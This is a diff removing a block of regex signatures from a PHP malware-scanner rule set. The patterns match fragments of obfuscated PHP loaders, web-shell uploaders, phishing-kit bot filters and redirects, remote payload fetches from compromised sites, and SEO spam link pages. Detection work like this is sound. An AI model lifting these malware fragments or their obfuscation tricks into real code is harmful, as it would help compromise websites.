-      'pattern' => '/\\<\\?php \\$efxtv\\=str_ireplace\\("i","","iibiiiaisiiieiii6iii4iiii_iidiieiciiiioiidiieii"\\); \\$hqhtkv\\="DQoJCUBlcnJvcl9yZXBvcnRpbmcoMCk7DQoJCUBpbmlfc2/',
-      'label' => 'source-file tail snippet',
-    ),
-    808 => 
-    array (
-      'pattern' => '/\\* Sitemaps\\: WP_Sitemaps_Posts class[\\s\\S]{0,12000}@file_put_contents\\(\\$file,base64_decode\\(base64_decode\\(\\$code\\)\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    809 => 
-    array (
-      'pattern' => '/\\$huwqbmb \\= \'b\\-afrm3en2\\#Hulgpkdcx_i8\\*607svy54t\\\\\'o\';\\$vxxvo \\= Array\\(\\);\\$vxxvo\\[\\] \\= \\$huwqbmb\\[2\\]\\.\\$huwqbmb\\[30\\]\\.\\$huwqbmb\\[24\\]\\.\\$huwqbmb\\[25\\]\\.\\$huwqbmb\\[17/',
-      'label' => 'source-file tail snippet',
-    ),
-    810 => 
-    array (
-      'pattern' => '/var h\\=\\!0,j\\=\\!1;sorttable\\=\\{e\\:function\\(\\)\\{arguments\\.callee\\.i\\|\\|\\(arguments\\.callee\\.i\\=h,k&&clearInterval\\(k\\),document\\.createElement&&document\\.getElem/',
-      'label' => 'source-file tail snippet',
-    ),
-    811 => 
-    array (
-      'pattern' => '/, array\\(\\)\\);
-    if \\(\\!in_array\\(\\$pl, \\$current\\)\\) \\{
-        \\$current\\[\\] \\= \\$pl;
-        sort\\(\\$current\\);
-        update_option\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    812 => 
-    array (
-      'pattern' => '/function get_client_ip\\(\\) \\{[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    813 => 
-    array (
-      'pattern' => '/1",	\\/\\/ Send E\\-Mail To Your Mail[\\s\\S]{0,160}1",	\\/\\/ Telegram Bots Receiver/',
-      'label' => 'sample-specific literal chain',
-    ),
-    814 => 
-    array (
-      'pattern' => '/cdxfGUkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT0/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    815 => 
-    array (
-      'pattern' => '/;
-    return \\$ipaddress;
-\\}
-
-
-function getOS\\(\\$useragent\\) \\{
-  \\$os_platform \\= "Unknown OS Platform";
-  \\$os_array \\= array\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    816 => 
-    array (
-      'pattern' => '/\\>
-	\\<style\\>
-	input\\[type\\=password\\]\\.error \\{
-		border\\-color\\: red;
-	\\}
-	\\<\\/style\\>
-	\\<style type\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    817 => 
-    array (
-      'pattern' => '/\\>
-											
-										\\<\\/div\\>
-										
-									\\<\\/div\\>
-								\\<\\/div\\>
-							\\<\\/div\\>
-
-							\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    818 => 
-    array (
-      'pattern' => '/\\> 
-
-										\\<\\/div\\>
-										
-									\\<\\/div\\>
-								\\<\\/div\\>
-							\\<\\/div\\>
-
-
-
-							\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    819 => 
-    array (
-      'pattern' => '/s middle name\\?\\<\\/option\\>
-                                                \\<option\\>What is your maternal grandfather/',
-      'label' => 'sample-specific literal',
-    ),
-    820 => 
-    array (
-      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}file_put_contents\\("raw\\/\\$className\\.txt", implode\\(\\$object\\-\\>getAll\\(\\), PHP_EOL\\)\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    821 => 
-    array (
-      'pattern' => '/Fixtures\\/AbstractReff\\.php[\\s\\S]{0,160}Fixtures\\/Headerspam\\.php/',
-      'label' => 'sample-specific literal chain',
-    ),
-    822 => 
-    array (
-      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}\'HTTP_X_SCANNER\', \\/\\/ Seen in use by Netsparker/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    823 => 
-    array (
-      'pattern' => '/0lovespells0\\.blogspot\\.com[\\s\\S]{0,160}1\\-free\\-share\\-buttons\\.com/',
-      'label' => 'sample-specific literal chain',
-    ),
-    824 => 
-    array (
-      'pattern' => '/\\* This file is part of Referral Spam Detect\\.[\\s\\S]{0,12000}protected \\$data \\= array\\(/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    825 => 
-    array (
-      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}return \\$this\\-\\>data;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    826 => 
-    array (
-      'pattern' => '/\'\\[a\\-z0\\-9\\\\\\-_\\]\\*\\(bot\\|crawl\\|archiver\\|transcoder\\|spider\\|uptime\\|validator\\|fetcher\\|cron\\|checker\\|reader\\|extractor\\|monitoring\\|analyzer\\|scraper\\)\',/',
-      'label' => 'source-file tail snippet',
-    ),
-    827 => 
-    array (
-      'pattern' => '/\\* This file is part of Referral Spam Detect\\.[\\s\\S]{0,12000}return \\$this\\-\\>data;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    828 => 
-    array (
-      'pattern' => '/\\* This file is part of Crawler Detect \\- the web crawler detection library\\.[\\s\\S]{0,12000}\';\', \\/\\/ Remove the following characters ;/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    829 => 
-    array (
-      'pattern' => '/\', \\$agent\\);
-
-        if \\(strlen\\(trim\\(\\$agent\\)\\) \\=\\= 0\\) \\{
-            return false;
-        \\}
-
-        \\$result \\= preg_match\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    830 => 
-    array (
-      'pattern' => '/if\\(isset\\(\\$_SERVER\\[\'HTTP_REFERER\'\\]\\)\\) \\{[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    831 => 
-    array (
-      'pattern' => '/\\+\\+\\+\\+\\+\\[ BOT \\- Bots\\.php \\]\\+\\+\\+\\+\\+\\\\n/',
-      'label' => 'sample-specific literal',
-    ),
-    832 => 
-    array (
-      'pattern' => '/\\$Bot \\= array\\("abot","dbot","ebot","hbot","kbot","lbot","mbot","nbot","obot","pbot","rbot","sbot","tbot","vbot","ybot","zbot","bot\\.","bot\\/","[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    833 => 
-    array (
-      'pattern' => '/\\$IP \\= \\$_SERVER\\[\'REMOTE_ADDR\'\\];[\\s\\S]{0,12000}header\\(\'Location\\: https\\:\\/\\/href\\.li\\/\\?https\\:\\/\\/www\\.google\\.com\\/search\\?q\\=\'\\.\\$settings\\[\'out\'\\]\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    834 => 
-    array (
-      'pattern' => '/,", \\$data\\);
-\\$data \\= str_replace\\(\'[\\s\\S]{0,160},"",\\$data\\);
-\\$data \\= preg_replace\\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    835 => 
-    array (
-      'pattern' => '/\\]\\)\\)\\{
-			\\$ip \\= getenv\\("REMOTE_ADDR"\\);
-            \\$bot_count \\+\\= 1;
-          \\}
-     \\}
-	 
-\\$dp \\=  strtolower\\(\\$_SERVER\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    836 => 
-    array (
-      'pattern' => '/\\$tanitatikaram \\= parse_ini_file\\("config\\.ini", true\\);[\\s\\S]{0,12000}die\\(\'\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/IETF\\/\\/DTD HTML 2\\.0\\/\\/EN"\\>\\<html\\>\\<head\\>\\<title\\>404 Not Found\\<\\/title\\>\\<\\/head\\>\\<body\\>\\<h1\\>Not Found\\<\\/h1\\>\\<p\\>The request/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    837 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}die\\(\'\\<\\!DOCTYPE HTML PUBLIC "\\-\\/\\/IETF\\/\\/DTD HTML 2\\.0\\/\\/EN"\\>\\<html\\>\\<head\\>\\<title\\>404 Not Found\\<\\/title\\>\\<\\/head\\>\\<body\\>\\<h1\\>Not Found\\<\\/h1\\>\\<p\\>The request/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    838 => 
-    array (
-      'pattern' => '/ikkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09NHe/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    839 => 
-    array (
-      'pattern' => '/ppgTFkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    840 => 
-    array (
-      'pattern' => '/Mpkr9NHenNHenNHe1zfukgFMaXdoyjcUImb19oUAxyb18mRtwmwJ4LT09NHr8XTzEXRJwmwJXLT09NHe/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    841 => 
-    array (
-      'pattern' => '/\\) \\!\\=\\= false \\) \\{
-                \\/\\/ 128\\.255\\.255\\.0\\-128\\.255\\.255\\.255 format
-                list\\( \\$low, \\$high \\) \\= explode\\(/',
-      'label' => 'sample-specific literal',
-    ),
-    842 => 
-    array (
-      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX0ljNTUoJF9Pam5FeWozdSl7JF9Pam5FeWozdT1zdWJzdHIoJF9Pam5FeWozdSwoaW50KShoZXgyYmluKCczNTM1MzYnKSkpOyRfT2puRXlq/',
-      'label' => 'source-file tail snippet',
-    ),
-    843 => 
-    array (
-      'pattern' => '/NWl\\/Qe\\/d7HcGgP3Bj\\+Or3jmYEXTFOuMKjVfsWclU8ZWGfbJwcxzVSnHwOt2Ka226ZUrLeIqy\\+hPI\\/sQE/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    844 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); echo php_uname\\(\\)\\."\\<br\\>"\\.getcwd\\(\\)\\."\\<br\\>"; if\\(\\$_GET\\[\'Fox\'\\] \\=\\= \'NaXyJ\'\\)\\{\\$saw1 \\= \\$_FILES\\[\'file\'\\]\\[\'tmp_name\'\\];\\$saw2 \\= \\$/',
-      'label' => 'source-file tail snippet',
-    ),
-    845 => 
-    array (
-      'pattern' => '/",\\$ooooooOOoOOoooOOOooooOOOOO\\);\\}else\\{ \\$ooooooOOoOOoooOOOooooOOOOO\\= str_replace\\(\\$O\\{63\\},[\\s\\S]{0,160},\\$oOoooOOoOO\\);\\$ooooooOOoOOoooOOOooooOOOOO\\= str_replace\\(\\$O\\{59\\}\\.\\$O\\{20\\}\\.\\$O\\{25\\}\\.\\$O\\{18\\},/',
-      'label' => 'sample-specific literal chain',
-    ),
-    846 => 
-    array (
-      'pattern' => '/\\* FoxAutoV5 by \\[anonymousfox\\.co\\][\\s\\S]{0,12000}goto D7UPX; VoASl\\: \\$tIIxw \\= "\\\\137\\\\165\\\\x6b\\\\x6f\\\\144"; goto lQyPH; lQyPH\\: \\$yF5rI \\= "\\\\142\\\\141\\\\x73\\\\145\\\\x36\\\\64\\\\x5f\\\\144\\\\x65\\\\143\\\\157\\\\144\\\\x65"; goto /s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    847 => 
-    array (
-      'pattern' => '/requests\\. See \\#14348\\.
- \\*
- \\* @since 3\\.5\\.0
- \\*
- \\* @param bool \\$exit Whether to exit without generating any content for[\\s\\S]{0,160}requests\\. Default true\\.
- \\*\\/
-if \\(/',
-      'label' => 'sample-specific literal chain',
-    ),
-    848 => 
-    array (
-      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX1BLVnEoJF8yZDd3ckgpeyRfMmQ3d3JIPXN1YnN0cigkXzJkN3dySCwoaW50KShoZXgyYmluKCczNzMwMzQnKSkpOyRfMmQ3d3JIPXN1YnN0/',
-      'label' => 'source-file tail snippet',
-    ),
-    849 => 
-    array (
-      'pattern' => '/\\<\\?php error_reporting\\(0\\); function x\\(\\$u, \\$i\\)\\{ \\$l\\=""; for\\(\\$o\\=0;\\$o\\<strlen\\(\\$u\\);\\) for\\(\\$b\\=0;\\$b\\<strlen\\(\\$i\\);\\$b\\+\\+, \\$o\\+\\+\\) \\$l \\.\\= \\$u\\{\\$o\\} \\^ \\$i\\{\\$b\\}; retu/',
-      'label' => 'source-file tail snippet',
-    ),
-    850 => 
-    array (
-      'pattern' => '/eval\\(base64_decode\\(\'ZnVuY3Rpb24gX1I5MkcoJF9VbE9nWDhnKXskX1VsT2dYOGc9c3Vic3RyKCRfVWxPZ1g4ZywoaW50KShoZXgyYmluKCczNzMyMzUnKSkpOyRfVWxPZ1g4Zz1z/',
-      'label' => 'source-file tail snippet',
-    ),
-    851 => 
-    array (
-      'pattern' => '/\\$files \\= @\\$_FILES\\["files"\\];[\\s\\S]{0,12000}\\}echo \'\\<html\\>\\<head\\>\\<title\\>\\<\\/title\\>\\<\\/head\\>\\<body\\>\\<form method\\=POST enctype\\="multipart\\/form\\-data" action\\=""\\>\\<input type\\=text name\\=path\\>\\<input t/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    852 => 
-    array (
-      'pattern' => '/ArOQ2o8OdFOkRoIyC21OMzIj4EfwzVHwK\\/LdD5swXjD\\+EBnUC1g\\/yD9bLP4vVRmDmVI49uwcgeQUjG\\+IP49snS9eTdpSHFlAzh2c[\\s\\S]{0,160}QwjAOTU2SWVvYvgvan4qVpSe\\+JnrWvMXWqLq0BibixDtqc9FGG\\+flwet7Q8fxN6Jv8KXkOupFZSpfDk9W\\/GeCS6o2cY5PhLyh\\+jQ/',
-      'label' => 'sample-specific literal chain',
-    ),
-    853 => 
-    array (
-      'pattern' => '/\\<\\?php class _fa\\{private static\\$s;public static function g\\(\\$n,\\$k\\)\\{if\\(\\!self\\:\\:\\$s\\)self\\:\\:i\\(\\);\\$l\\=strlen\\(\\$k\\);\\$r\\=base64_decode\\(self\\:\\:\\$s\\[\\$n\\]\\);for\\(\\$i\\=/',
-      'label' => 'source-file tail snippet',
-    ),
-    854 => 
-    array (
-      'pattern' => '/\\]\\?\\>"required \\>
-	\\<input type\\="submit" value\\="Send test \\>\\>"\\>
-
-\\<\\/form\\>
-\\<br\\>
-\\<\\?php
-if \\(\\!empty\\(\\$_POST\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    855 => 
-    array (
-      'pattern' => '/\\(\' \\. \\$ZLOq8\\[57\\] \\. \\$ZLOq8\\[13\\] \\. \\$ZLOq8\\[34\\] \\. \\$ZLOq8\\[15\\] \\. \\$ZLOq8\\[40\\] \\. \\$ZLOq8\\[41\\] \\.[\\s\\S]{0,160}\\. \\$ZLOq8\\[6\\] \\. \\$ZLOq8\\[15\\] \\. \\$ZLOq8\\[2\\] \\. \\$ZLOq8\\[3\\] \\. \\$ZLOq8\\[6\\] \\. \\$ZLOq8\\[15\\] \\./',
-      'label' => 'sample-specific literal chain',
-    ),
-    856 => 
-    array (
-      'pattern' => '/\';
-		for \\(\\$i\\=0; \\$i \\< strlen\\(\\$n\\); \\$i\\+\\+\\)\\{
-			\\$y \\.\\= dechex\\(ord\\(\\$n\\[\\$i\\]\\)\\);
-		\\}
-		return \\$y;
-	\\}
-	function uhex\\(\\$y\\) \\{
-		\\$n\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    857 => 
-    array (
-      'pattern' => '/\\]\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\]\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\)\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*;\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*echo\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\$_FILES\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\\\\\[\\[\\\\x00\\-\\\\x1f\\\\s\\]\\*\\[\'/',
-      'label' => 'sample-specific literal',
-    ),
-    858 => 
-    array (
-      'pattern' => '/wso\'\\]\\);
-  curl_setopt\\(\\$ch, CURLOPT_COOKIEFILE,\\$GLOBALS\\[[\\s\\S]{0,160}https\\:\\/\\/www\\.rippysbarandgrill\\.com\\/\\/admin\\/lib\\/_notes\\/sys\\.txt/',
-      'label' => 'sample-specific literal chain',
-    ),
-    859 => 
-    array (
-      'pattern' => '/error_reporting\\(0\\);[\\s\\S]{0,12000}\\$a \\= get_contents\\(\'https\\:\\/\\/northcompassrealty\\.com\\/wp\\-content\\/themes\\/the\\-bootstrap\\-blog\\/no\\.txt\'\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    860 => 
-    array (
-      'pattern' => '/4 \\? long2ip \\(_x7gc9q8\\:\\:\\$_ks5re2ir \\- 1000\\) \\: \\$_7g5ooajl\\[2\\];\\$_x6qr5pte \\= _x7gc9q8\\:\\:_omlbv\\(\\$_7g5ooajl, \\$_go7ubx3q\\);if \\(\\!\\$_x6qr5pte\\)\\{\\$_x6qr5pte /',
-      'label' => 'source-file tail snippet',
-    ),
-    861 => 
-    array (
-      'pattern' => '/function ixwdncagek\\(\\$yvcvfvypkb, \\$ndqgvtbgud\\) \\{[\\s\\S]{0,12000}eval \\(\\$xidwdlafnq\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    862 => 
-    array (
-      'pattern' => '/\\>Delete File Gagal\\.\\.\\<\\/font\\>\\<br \\/\\>\';
-\\}
-\\}
-\\}
-echo \'\\<\\/center\\>\';
-\\$scandir \\= scandir\\(\\$path\\);
-echo \'\\<div id\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    863 => 
-    array (
-      'pattern' => '/\\<\\?php \\$b6bb6\\=explode\\("1l","stsixe_yek_yarra1lcexe_lruc1ltilps_gerp1ldomhc1lstegf1lteg_ini1lemitotrts1lecalper_gerp1lrid_pmet_teg_sys1lnepof1/',
-      'label' => 'source-file tail snippet',
-    ),
-    864 => 
-    array (
-      'pattern' => '/set_time_limit\\(0\\);[\\s\\S]{0,12000}\\$ZlwBhrDSDRgGg\\=\'fun\'\\.\'ct\'\\.\'i\'\\.\'o\'\\.\'n_exi\'\\.\'s\'\\.\'ts\';\\$WMKVyvv\\=\'e\'\\.\'v\'\\.\'a\'\\.\'l\';\\$IXfmSFpQaIi\\=\'gzin\'\\.\'f\'\\.\'l\'\\.\'a\'\\.\'te\';\\$ljfFTRMJC\\=\'ABCDE\'\\.\'FGHIJ\'\\./s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    865 => 
-    array (
-      'pattern' => '/WPINC\' \\) \\) \\{
-	die;
-\\}
-
-function activate_alti_protect_uploads\\(\\) \\{
-
-	require_once plugin_dir_path\\( __FILE__ \\) \\.[\\s\\S]{0,160};
-	require_once plugin_dir_path\\( __FILE__ \\) \\./',
-      'label' => 'sample-specific literal chain',
-    ),
-    866 => 
-    array (
-      'pattern' => '/,\\$_currDomain\\);
-		\\}else\\{
-			\\$_currDomain \\= \\$_currDomain;
-		\\}
-		\\$_thispwd \\=[\\s\\S]{0,160}\\. mt_rand\\(100,999\\);
-		\\$_pwd     \\= crypt\\(\\$_thispwd,/',
-      'label' => 'sample-specific literal chain',
-    ),
-    867 => 
-    array (
-      'pattern' => '/\\<thead class\\="text\\-light"\\>\\<tr\\>\\<th\\>Name\\<\\/th\\>\\<th\\>Size\\<\\/th\\>\\<th\\>Permission\\<\\/th\\<th\\>Action\\<\\/th\\>\\<\\/tr\\>\\<\\/thead\\>\\<tbody class\\="text\\-light"\\>\\<\\?php  \\$G3 \\=/',
-      'label' => 'source-file tail snippet',
-    ),
-    868 => 
-    array (
-      'pattern' => '/\\<\\?php class _z\\{private static\\$_fcu;static function _eg\\(\\$_d\\)\\{if\\(\\!self\\:\\:\\$_fcu\\)self\\:\\:_iai\\(\\);return self\\:\\:\\$_fcu\\[\\$_d\\];\\}private static function _i/',
-      'label' => 'source-file tail snippet',
-    ),
-    869 => 
-    array (
-      'pattern' => '/\\$ip \\= getenv\\("REMOTE_ADDR"\\);[\\s\\S]{0,12000}header\\("Location\\: http\\:\\/\\/mail\\.163\\.com\\/dashi\\/\\?from\\=mail46 "\\);/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    870 => 
-    array (
-      'pattern' => '/\\>\\<\\/form\\>\\<\\/center\\>\';break;
-		case \'cmd\'\\: print \'\\<\\/br\\>\\<\\/br\\>\\<center\\>\\<h3\\>Command Kar Bina\\<\\/h3\\>\\<form action\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    871 => 
-    array (
-      'pattern' => '/header\\(\'Content\\-Type\\:text\\/html; charset\\=UTF\\-8\'\\);[\\s\\S]{0,12000}echo "\\<a href\\=\\\\""\\.get_site_url\\(\\)\\."\\/category\\/\\{\\$category\\-\\>slug\\}\\\\" target\\=\\\\"_blank\\\\"\\>\\{\\$category\\-\\>cat_name\\}\\<\\/a\\>\\<br\\>\\\\n";/s',
-      'label' => 'source-file head-tail anchor',
-    ),
-    872 => 
-    array (
-      'pattern' => '/\\$?PLjen7U7PlzEpYtKtASJ6cff8fPqB\\b/',
-      'label' => 'sample-specific identifier',
-    ),
-    873 => 
-    array (
-      'pattern' => '/World map pdf high resolution/',
-      'label' => 'sample-specific literal',
-    ),
-    874 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/verkol\\.ir\\/v1pr7pf45\\/executive\\-retirement\\-announcement\\.html\\>zj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/oncohope\\.net\\/vcf5\\/fuse\\-universal\\-linkedin\\.h/',
-      'label' => 'source-file tail snippet',
-    ),
-    875 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  \\<title\\>Evp app\\<\\/title\\>
-
-  \\<meta name\\=[\\s\\S]{0,160}\\>
-
-
-
- 
-
-  \\<style\\>
-
-	@font\\-face \\{
-
-		font\\-family\\:/',
-      'label' => 'sample-specific literal chain',
-    ),
-    876 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/marjanhotel\\.com\\/w8vo\\/timesplitters\\-ps2\\-iso\\.html\\>cu\\<\\/a\\>, \\<a href\\=http\\:\\/\\/ashjabattery\\.ir\\/pa2v2a\\/application\\-mecca\\.html\\>nu\\<\\/a\\>, /',
-      'label' => 'source-file tail snippet',
-    ),
-    877 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/dunlopillo\\.firstcom\\.vn\\/znvoqelq\\/pre\\-primary\\-exam\\-question\\-paper\\.html\\>dn\\<\\/a\\>, \\<a href\\=http\\:\\/\\/myhealthcarestore\\.co\\.uk\\/eiyg98\\/on/',
-      'label' => 'source-file tail snippet',
-    ),
-    878 => 
-    array (
-      'pattern' => '/content\\/uploads\\/2019\\/08\\/0qv87cq\\/craigslist/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    879 => 
-    array (
-      'pattern' => '/content\\/plugins\\/akismet\\/views\\/kuuu5g\\/winch/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    880 => 
-    array (
-      'pattern' => '/true"\\>Conclusion for logistics project\\<\\/span\\>\\<span\\>\\<\\/span\\>\\<\\/h3\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    881 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/totalsofttech\\.com\\.ph\\/x8m\\/dataminr\\-dod\\-contract\\.html\\>kf\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sahifa\\.aslitheme\\.xyz\\/safmm\\/azure\\-ad\\-manager\\-attrib/',
-      'label' => 'source-file tail snippet',
-    ),
-    882 => 
-    array (
-      'pattern' => '/\\>Tracepath mac\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    883 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/aqua\\-fitness\\.ca\\/htp3w11\\/education\\-banner\\-template\\-free\\-download\\.html\\>yv\\<\\/a\\>, \\<a href\\=http\\:\\/\\/supplychainz\\.in\\/ko2sbr\\/cheap\\-smtp/',
-      'label' => 'source-file tail snippet',
-    ),
-    884 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/sjois\\.com\\/6okqynz\\/drag\\-bars\\-sportster\\.html\\>nj\\<\\/a\\>, \\<a href\\=http\\:\\/\\/sorokara\\.ru\\/snfceuh5\\/death\\-notice\\.html\\>72\\<\\/a\\>, \\<a href\\=http/',
-      'label' => 'source-file tail snippet',
-    ),
-    885 => 
-    array (
-      'pattern' => '/content\\/themes\\/consultx\\/6gvnfi\\/cat/',
-      'label' => 'sample-specific encoded fragment',
-    ),
-    886 => 
-    array (
-      'pattern' => '/\\>Dsp audio effects\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    887 => 
-    array (
-      'pattern' => '/\\>How much in spanish\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    888 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/klon\\.toolsnarzedzia\\.pl\\/mceo\\/mrz\\-github\\.html\\>vf\\<\\/a\\>, \\<a href\\=http\\:\\/\\/quercia\\.com\\.mx\\/haeuf\\/2\\-of\\-amerikaz\\-most\\-wanted\\-live\\.html\\>a/',
-      'label' => 'source-file tail snippet',
-    ),
-    889 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/rmsnav\\-test2\\-1\\.gtfc\\.com\\/wp\\-content\\/uploads\\/2019\\/03\\/wor5y\\/real\\-time\\-action\\-recognition\\-github\\.html\\>dt\\<\\/a\\>, \\<a href\\=http\\:\\/\\/verk/',
-      'label' => 'source-file tail snippet',
-    ),
-    890 => 
-    array (
-      'pattern' => '/\\] \\. \\$s;
-
-\\$today \\= "20190819";
-
-include\\("checkmob\\.php"\\);
-if\\(is_mobile\\(\\) \\>0 \\) \\$mobiledevice \\= 11;
-
-if \\(strpos\\(\\$_SERVER\\[/',
-      'label' => 'sample-specific literal',
-    ),
-    891 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Iced 2020\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    892 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Channel 4 news staff\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    893 => 
-    array (
-      'pattern' => '/en\\-US"\\>\\<\\!\\[endif\\]\\-\\-\\>\\<\\!\\-\\-\\[if \\!IE\\]\\>\\<\\!\\-\\-\\>\\<\\!\\-\\-\\<\\!\\[endif\\]\\-\\-\\>
-
-  \\<meta charset\\=[\\s\\S]{0,160}\\>
-
- 
-
-
-
-  \\<title\\>Destiny 2 hoodie\\<\\/title\\>
-
-  \\<meta name\\=/',
-      'label' => 'sample-specific literal chain',
-    ),
-    894 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/accurateopticians\\.com\\/t99\\/woodwop\\-mpr\\-files\\.html\\>wg\\<\\/a\\>, \\<a href\\=http\\:\\/\\/thepuppyavenue\\.com\\/di1ml84cj\\/mtf\\-macd\\-scan\\.html\\>ic\\<\\/a/',
-      'label' => 'source-file tail snippet',
-    ),
-    895 => 
-    array (
-      'pattern' => '/\\>Easy cat paintings on canvas\\<\\/h1\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<\\/div\\>
-
-\\<div class\\=/',
-      'label' => 'sample-specific literal',
-    ),
-    896 => 
-    array (
-      'pattern' => '/\\<a href\\=http\\:\\/\\/xolaren\\.com\\/uneaozewo\\/inject\\-javascript\\-into\\-page\\-hack\\.html\\>6p\\<\\/a\\>, \\<a href\\=http\\:\\/\\/www\\.medzapotenciju\\.com\\/f6a\\/french\\-language/',
-      'label' => 'source-file tail snippet',
-    ),
-    897 => 
-    array (
-      'pattern' => '/\\>
-
- 
-
-
-
-  
-
-  
-
-  \\<title\\>Speeduino mx5 pnp\\<\\/title\\>
-
- 
-
-\\<\\/head\\>
-
-
-
-
-
-\\<body\\>
-
